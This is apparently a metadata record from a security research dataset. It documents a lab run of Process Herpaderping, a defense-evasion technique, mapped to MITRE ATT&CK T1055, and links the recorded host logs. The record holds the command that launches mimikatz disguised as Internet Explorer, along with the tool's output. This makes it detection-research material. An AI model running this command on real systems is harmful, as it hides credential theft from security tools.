title: Process Herpaderping Mimikatz IExplorer
id: SDWIN-201026235835
author: Roberto Rodriguez @Cyb3rWard0g
creation_date: 2020/10/26
modification_date: 2020/10/26
platform: Windows
tags:
description: This dataset represents the execution of a Process Herpaderping to obscure the intentions of a process by modifying the content on disk after the image has been mapped.
attack_mappings:
  - technique: T1055
    sub-technique:
    tactics:
      - TA0004
      - TA0005
notebooks:
files:
- type: Host
  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/cmd_process_herpaderping_mimiexplorer.zip
simulation:
  environment: Lab VM
  tools:
    - type: Manual
      name: Cmd
      module: Cmd
      script: https://github.com/jxy-s/herpaderping
  permissions_required:
    - Administrator
  adversary_view: |-
    C:\Users\wardog\Desktop>ProcessHerpaderping.exe mimikatz.exe wardog.exe "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
    Process Herpaderping Tool - Copyright (c) 2020 Johnny Shaw
    [13032:12676][OK]    Source File: "mimikatz.exe"
    [13032:12676][OK]    Target File: "wardog.exe"
    [13032:12676][INFO]  Copied source binary to target file
    [13032:12676][INFO]  Created image section for target
    [13032:12676][INFO]  Created process object, PID 5512
    [13032:12676][INFO]  Located target image entry RVA 0x000c3aec
    [13032:12676][OK]    Replacing target with "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
    [13032:12676][INFO]  Fixing up target replacement, hiding original bytes and retaining any signature
    [13032:12676][OK]    Preparing target for execution
    [13032:12676][INFO]  Writing process parameters, remote PEB ProcessParameters 0x0000000000372020
    [13032:12676][INFO]  Creating thread in process at entry point 0x00007FF7C07F3AEC
    [13032:12676][INFO]  Created thread, TID 1996
    [13032:12676][OK]    Waiting for herpaderped process to exit
references:
  - https://github.com/jxy-s/herpaderping